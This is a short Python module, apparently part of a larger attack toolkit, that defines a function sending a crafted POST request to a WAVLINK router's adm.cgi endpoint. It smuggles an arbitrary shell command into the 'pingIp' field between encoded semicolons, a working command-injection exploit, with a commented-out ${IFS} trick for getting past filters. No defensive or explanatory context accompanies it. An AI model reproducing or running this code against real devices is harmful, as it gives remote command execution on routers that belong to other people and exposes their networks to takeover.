#! python !#
from misc.session import *
import urllib.parse

def wavlink_wh(ip, cmd, session):
    try:
        #encode command as url
        command = urllib.parse.quote_plus(cmd)
        #command.replace(' ', '${IFS}')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q =0.9, image/avif, image/webp, image/apng,*/*;q=0.8, application/signed-exchange; v=b3;q=0.9',
            'Accept-Language': 'en-US, en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            'Origin': 'null',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Applewebkit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        data = f'page=ping_test&CCMD=4&pingIp=%3B{command}%3B'

        response = session.post(f'https://{ip}/cgi-bin/adm.cgi', headers=headers, data=data)
        return True
    except Exception as e: return (False, e)